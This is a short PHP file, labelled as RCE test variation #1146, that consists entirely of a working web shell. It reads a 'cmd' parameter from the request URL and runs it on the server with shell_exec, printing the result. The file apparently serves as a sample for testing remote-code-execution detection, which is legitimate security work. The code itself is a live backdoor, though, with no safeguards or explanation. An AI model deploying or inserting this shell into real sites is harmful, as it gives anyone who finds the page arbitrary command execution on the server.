<?php
// RCE test variation #1146
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>